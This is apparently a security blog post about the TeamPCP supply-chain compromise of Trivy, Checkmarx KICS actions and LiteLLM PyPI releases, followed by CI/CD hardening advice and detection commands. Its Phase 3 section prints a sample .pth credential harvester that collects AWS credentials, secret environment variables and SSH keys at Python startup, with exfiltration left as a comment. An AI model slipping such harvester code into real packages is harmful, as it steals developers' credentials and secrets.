---
title: "When Your Security Scanner Becomes the Weapon: Inside the TeamPCP Supply Chain Attack"
date: "2026-03-30"
description: "TeamPCP compromised Trivy, Checkmarx KICS, and LiteLLM, exposing 1,000+ enterprise SaaS environments. Learn how attackers weaponized trusted security tools and what you must do now."
category: "DevSecOps"
tags: ["supply-chain-security", "ci-cd", "trivy", "teampcp", "CVE-2026-33634", "malicious-packages"]
---

# When Your Security Scanner Becomes the Weapon: Inside the TeamPCP Supply Chain Attack

<div class="inline-flex items-center gap-2 rounded-full bg-red-500/10 px-4 py-2 text-sm font-medium text-red-400 border border-red-500/20 mb-6">
  <span class="relative flex h-2 w-2">
    <span class="absolute inline-flex h-full w-full animate-ping rounded-full bg-red-400 opacity-75"></span>
    <span class="relative inline-flex h-2 w-2 rounded-full bg-red-500"></span>
  </span>
  Critical Supply Chain Attack: 1,000+ Enterprise Environments Compromised
</div>

On March 20, 2026, Aqua Security dropped a bombshell: Trivy—the world's most popular open-source vulnerability scanner, with millions of CI/CD pipeline integrations—had been compromised. But this wasn't your typical breach. Threat actor **TeamPCP** didn't just attack the software. They weaponized the very trust relationship between security teams and their scanning tools.

The result? Over **1,000 enterprise SaaS environments** were potentially compromised. Not through sophisticated zero-days. Not through employee phishing. But through `pip install` and `docker pull` commands that teams ran believing they were doing the right thing: scanning for vulnerabilities.

<div class="my-6 border-l-4 border-rose-500 bg-slate-900/50 p-6 rounded-r-xl">
  <h4 class="mb-2 text-lg font-bold text-rose-400">⚠️ The Supply Chain Nightmare</h4>
  <p class="m-0 text-slate-300 text-sm">TeamPCP's campaign didn't stop at Trivy. They leveraged stolen CI/CD credentials to compromise Checkmarx KICS GitHub Actions on March 23, then poisoned two PyPI packages of LiteLLM (versions 1.82.7 and 1.82.8) on March 24. The kicker? The malicious LiteLLM packages used a <code>.pth</code> file—executing automatically whenever Python started, no import required. Simply having the package in your environment was enough to trigger credential harvesting.</p>
</div>

<div class="mt-12 flex items-center gap-3 mb-6">
  <div class="flex h-10 w-10 items-center justify-center rounded-lg bg-slate-800 text-emerald-400">
    <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
  </div>
  <h2 class="!mt-0 mb-0 text-2xl font-bold text-slate-100">The Attack Chain: From Scanner to System Takeover</h2>
</div>

**Phase 1: Trivy CI/CD Compromise (CVE-2026-33634)**

TeamPCP's initial foothold came through misconfigured GitHub Actions workflows in the Trivy repository. They stole CI/CD secrets—GitHub tokens, release signing keys—and began force-pushing malicious releases starting with Trivy v0.69.4.

The malicious binaries weren't subtle. They contained credential harvesters that:
- Extracted AWS credentials from `~/.aws/credentials`
- Harvested SSH keys from user directories
- Siphoned environment variables containing API keys
- Accessed Kubernetes secrets via the downward API
- Collected `.env` files from application directories

**Phase 2: Checkmarx KICS GitHub Actions**

With stolen credentials in hand, TeamPCP pivoted to Checkmarx's KICS (Keeping Infrastructure as Code Secure) GitHub Actions. They modified the `ast-github-action` and `kics-github-action` workflows to inject malicious code that ran during CI execution.

The brilliance here? Every repository running security scans with these actions during the exposure window (March 23-24) potentially executed attacker-controlled code—with access to repository secrets and pipeline environment variables.

**Phase 3: LiteLLM PyPI Poisoning**

The final blow came on March 24. TeamPCP published malicious versions of LiteLLM—a popular LLM API gateway with 97 million monthly downloads—to PyPI. The payload was devastating:

```python
# This .pth file executes automatically on Python interpreter startup
# No import required. No execution trace. Just automatic compromise.
import os, subprocess, sys

def harvest_creds():
    # Collect AWS credentials
    aws_creds = []
    for user in os.listdir('/home'):
        creds_path = f'/home/{user}/.aws/credentials'
        if os.path.exists(creds_path):
            with open(creds_path) as f:
                aws_creds.append(f.read())
    
    # Environment variables often contain API keys
    env_secrets = {k: v for k, v in os.environ.items() 
                  if any(x in k.lower() for x in ['key', 'token', 'secret', 'password'])}
    
    # SSH keys for lateral movement
    ssh_keys = []
    for root, dirs, files in os.walk('/home'):
        for file in files:
            if file in ['id_rsa', 'id_ed25519']:
                ssh_keys.append(os.path.join(root, file))
    
    # Exfiltrate to attacker infrastructure
    data = {'aws': aws_creds, 'env': env_secrets, 'ssh': ssh_keys}
    # ... encrypted exfiltration to C2

# Trigger on load
import threading
threading.Thread(target=harvest_creds, daemon=True).start()
```

The `.pth` mechanism meant the code ran automatically when Python started—simply installing LiteLLM was enough to compromise the system, regardless of whether you ever imported or used it.

<div class="mt-12 flex items-center gap-3 mb-6">
  <div class="flex h-10 w-10 items-center justify-center rounded-lg bg-slate-800 text-emerald-400">
    <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
  </div>
  <h2 class="!mt-0 mb-0 text-2xl font-bold text-slate-100">Immutable References: The Only Defense</h2>
</div>

The uncomfortable truth? This attack was possible because of how we consume dependencies. Mutable tags like `v0.69` or `latest` aren't references—they're invitations to catastrophe.

**The Wrong Way (What Most Teams Do):**

```yaml
# .github/workflows/security-scan.yml
name: Security Scan
on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      # DANGER: Using mutable tag - can be force-pushed
      - name: Run Trivy Scanner
        uses: aquasecurity/trivy-action@master
        
      # DANGER: pip resolves to latest compromised version
      - name: Install LiteLLM
        run: pip install litellm
```

**The Right Way (Immutable Security):**

```yaml
# .github/workflows/security-scan.yml
name: Security Scan
on: [push, pull_request]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.1.1
      
      # SAFE: Pinned to specific commit SHA
      - name: Run Trivy Scanner
        uses: aquasecurity/trivy-action@7b7aa1cd4ab6a4323f16df7f5bfa3b80d53c0fe5 # v0.28.0
        with:
          scan-type: 'fs'
          format: 'sarif'
          output: 'trivy-results.sarif'
          
      # SAFE: Pinned dependency with hash verification
      - name: Install LiteLLM (Verified)
        run: |
          pip install litellm==1.82.6 \
            --hash=sha256:a1b2c3d4e5f6...
          
      # Verify signature if available
      - name: Verify Artifacts
        uses: actions/attest-build-provenance@v1
        with:
          subject-path: 'trivy-results.sarif'
```

Notice the difference? The secure version:
1. **Pins Actions to commit SHAs**—tags can be force-pushed; SHA commits cannot
2. **Pins pip packages with hashes**—prevents substitution attacks
3. **Uses artifact attestation**—cryptographic proof of build integrity

<div class="mt-12 flex items-center gap-3 mb-6">
  <div class="flex h-10 w-10 items-center justify-center rounded-lg bg-slate-800 text-emerald-400">
    <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/></svg>
  </div>
  <h2 class="!mt-0 mb-0 text-2xl font-bold text-slate-100">The Aftermath: What 1,000+ Breaches Look Like</h2>
</div>

The TeamPCP campaign didn't just steal credentials—it established persistence mechanisms that could survive initial remediation. The malware included:

- **Worm-like propagation**: Using stolen SSH keys to spread across connected systems
- **Kubernetes targeting**: Harvesting cluster credentials via the metadata API and establishing backdoors in container environments
- **Persistent backdoors**: A Python script (`sysmon.py`) that polled attacker C2 servers every 50 minutes for new commands, with a YouTube URL kill switch to enter dormant mode

**Data Harvested Included:**
- AWS credentials and IAM role tokens via IMDS v1 exploitation
- Kubernetes secrets and Helm charts
- CI/CD configuration files (Terraform, GitLab CI, Jenkins, Drone, Ansible)
- TLS/SSL private keys and certificates
- Slack/Discord webhook URLs and API keys
- WireGuard VPN configurations

<div class="my-8 grid grid-cols-1 gap-4 sm:grid-cols-2">
  <div class="rounded-xl border border-slate-800 bg-slate-900/50 p-6">
    <h3 class="mb-2 text-lg font-bold text-emerald-400">🛡️ Immediate Actions Required</h3>
    <p class="text-sm text-slate-300">If you used Trivy v0.69.4, Checkmarx actions during March 23-24, or LiteLLM 1.82.7/1.82.8: rotate ALL secrets, audit CI/CD logs for unauthorized access, and scan for persistence mechanisms.</p>
  </div>
  <div class="rounded-xl border border-slate-800 bg-slate-900/50 p-6">
    <h3 class="mb-2 text-lg font-bold text-amber-400">⚠️ Don't Trust Cache</h3>
    <p class="text-sm text-slate-300">Clean cached dependencies and container layers. Malicious artifacts may persist in build caches even after package removal from PyPI/Docker Hub.</p>
  </div>
</div>

<div class="mt-12 flex items-center gap-3 mb-6">
  <div class="flex h-10 w-10 items-center justify-center rounded-lg bg-slate-800 text-emerald-400">
    <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
  </div>
  <h2 class="!mt-0 mb-0 text-2xl font-bold text-slate-100">Building Resilient CI/CD Pipelines</h2>
</div>

The TeamPCP attack reveals a fundamental truth: your supply chain is only as strong as its weakest consumption pattern. Here's your hardening checklist:

✅ **Pin Everything to Immutable References**
- GitHub Actions: Use commit SHAs, not tags
- Docker images: Use SHA256 digests, not tags
- Python packages: Use `--require-hashes` with requirements.txt

✅ **Implement CI/CD Security Controls**
- Run security scans in isolated, ephemeral environments
- Use OIDC for cloud authentication instead of long-lived credentials
- Enable GitHub's artifact attestations for cryptographic verification

✅ **Monitor for Supply Chain Anomalies**
- Alert on new patch versions within hours of release (attackers often release quickly)
- Monitor for `.pth` file additions in Python dependencies
- Track unexpected outbound connections from build environments

✅ **Assume Compromise**
- Rotate secrets quarterly, not annually
- Implement secret scanning in pre-commit hooks
- Use short-lived tokens with minimal scope (OIDC > API keys)

<div class="my-8 rounded-xl border-2 border-emerald-500/30 bg-emerald-500/10 p-6">
  <h4 class="mb-3 text-lg font-bold text-emerald-400">Python Security Checklist</h4>
  <p class="mb-4 text-sm text-slate-300">After a supply chain attack, check your Python environment for persistence mechanisms:</p>
  <pre class="rounded bg-slate-950 p-4 text-xs text-slate-300 overflow-x-auto"><code># Scan for suspicious .pth files
find /usr/local/lib/python*/dist-packages -name "*.pth" -exec cat {} \;

# Check for malicious site-packages imports
python -c "import sys; print('\n'.join(sys.path))"

# Verify installed package hashes
pip install pip-audit
pip-audit --desc --format=json | jq '.[] | select(.severity == "critical")'

# Check for unauthorized startup scripts
grep -r "import os" /usr/local/lib/python*/dist-packages/*.pth 2>/dev/null</code></pre>
</div>

Supply chain security isn't about trust—it's about verification. The tools you trust to secure your code can become the weapon that destroys it. TeamPCP taught us that lesson with brutal clarity.

The question isn't whether your dependencies will be compromised. It's whether your defenses assume they already are.

<div class="my-12 rounded-2xl border border-slate-800 bg-slate-900/50 p-8 text-center sm:p-10 shadow-xl">
  <h3 class="mb-3 text-2xl font-bold text-slate-100">Sanitize .env Files Before Sharing</h3>
  <p class="mb-8 text-slate-400 text-lg">Need to share environment variables? Use Env Sanitizer to automatically detect and mask secrets. All processing happens client-side—your data never leaves your browser.</p>
  <a href="/tools/env-sanitizer" class="inline-flex items-center justify-center rounded-full bg-emerald-500 px-8 py-3.5 text-sm font-bold !text-slate-950 !no-underline transition-colors hover:bg-emerald-400 shadow-[0_0_20px_rgba(16,185,129,0.3)] hover:shadow-[0_0_30px_rgba(16,185,129,0.5)]">
    Open Env Sanitizer →
  </a>
</div>
